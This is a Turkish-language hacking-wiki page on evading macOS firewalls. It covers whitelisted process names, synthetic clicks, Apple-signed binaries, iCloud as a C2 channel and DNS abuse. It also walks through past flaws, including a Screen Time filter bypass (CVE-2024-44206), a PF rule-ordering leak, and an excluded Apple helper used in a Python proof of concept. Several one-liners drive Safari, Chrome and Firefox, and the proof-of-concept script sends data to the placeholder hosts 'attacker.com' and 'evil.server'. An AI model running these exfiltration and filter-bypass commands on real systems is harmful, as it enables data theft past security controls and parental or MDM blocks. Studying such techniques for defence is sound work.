# macOS Güvenlik Duvarlarını Aşma

{{#include ../../banners/hacktricks-training.md}}

## Bulunan teknikler

Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalıştığı bulunmuştur.

### Beyaz liste isimlerini kötüye kullanma

- Örneğin, kötü amaçlı yazılımı **`launchd`** gibi iyi bilinen macOS süreçlerinin isimleriyle çağırmak.

### Sentetik Tıklama

- Eğer güvenlik duvarı kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver** butonuna tıklamasını sağlamak.

### **Apple imzalı ikililer kullanma**

- **`curl`** gibi, ama ayrıca **`whois`** gibi diğerleri de.

### İyi bilinen apple alan adları

Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.

### Genel Bypass

Güvenlik duvarlarını aşmayı denemek için bazı fikirler.

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alan adlarını veya hangi uygulamaların bunlara erişmesine izin verildiğini belirlemenize yardımcı olacaktır.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS'i Kötüye Kullanma

DNS çözümlemeleri, muhtemelen DNS sunucularıyla iletişim kurmasına izin verilen **`mdnsreponder`** imzalı uygulama aracılığıyla yapılır.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı Uygulamaları Üzerinden

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Süreç enjeksiyonları aracılığıyla

Eğer herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Son macOS güvenlik duvarı aşma zafiyetleri (2023-2025)

### Web içerik filtresi (Ekran Süresi) aşma – **CVE-2024-44206**
Temmuz 2024'te Apple, Ekran Süresi ebeveyn kontrolleri tarafından kullanılan sistem genelindeki “Web içerik filtresi”ni bozmuş olan kritik bir hatayı Safari/WebKit'te düzeltti. 
Özel olarak hazırlanmış bir URI (örneğin, çift URL kodlamalı “://” ile) Ekran Süresi ACL'si tarafından tanınmaz ancak WebKit tarafından kabul edilir, bu nedenle istek filtrelenmeden gönderilir. URL açabilen herhangi bir süreç (sandboxed veya imzasız kod dahil) bu nedenle kullanıcı veya bir MDM profili tarafından açıkça engellenen alanlara ulaşabilir.

Pratik test (yamanmamış sistem):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) kural sıralama hatası erken macOS 14 “Sonoma”da
macOS 14 beta döngüsü sırasında Apple, **`pfctl`** etrafındaki kullanıcı alanı sarmalayıcısında bir regresyon tanıttı. `quick` anahtar kelimesi ile eklenen kurallar (birçok VPN kill-switch tarafından kullanılan) sessizce göz ardı edildi ve bir VPN/firewall GUI *engellendi* rapor etse bile trafik sızıntılarına neden oldu. Hata, birkaç VPN satıcısı tarafından doğrulandı ve RC 2'de (build 23A344) düzeltildi.

Hızlı sızıntı kontrolü:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple imzalı yardımcı hizmetlerin kötüye kullanılması (eski – macOS 11.2 öncesi)
macOS 11.2'den önce **`ContentFilterExclusionList`** yaklaşık 50 Apple ikili dosyasının, **`nsurlsessiond`** ve App Store gibi, Network Extension çerçevesi ile uygulanan tüm soket filtreli güvenlik duvarlarını atlamasına izin veriyordu (LuLu, Little Snitch, vb.). Kötü amaçlı yazılım, basitçe hariç tutulan bir süreci başlatabilir veya ona kod enjekte edebilir ve kendi trafiğini zaten izin verilen soket üzerinden tünelleyebilirdi. Apple, macOS 11.2'de hariç tutma listesini tamamen kaldırdı, ancak bu teknik, yükseltilemeyen sistemlerde hala geçerlidir.

Örnek kanıt konsepti (11.2 öncesi):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Modern macOS için Araç İpuçları

1. GUI güvenlik duvarlarının oluşturduğu mevcut PF kurallarını inceleyin:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Zaten *outgoing-network* yetkisine sahip olan ikili dosyaları listeleyin (piggy-backing için yararlıdır):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift'te kendi Ağ Uzantısı içerik filtresini programatik olarak kaydedin.
Paketleri yerel bir sokete yönlendiren minimal rootless PoC, Patrick Wardle’ın **LuLu** kaynak kodunda mevcuttur.

## Referanslar

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
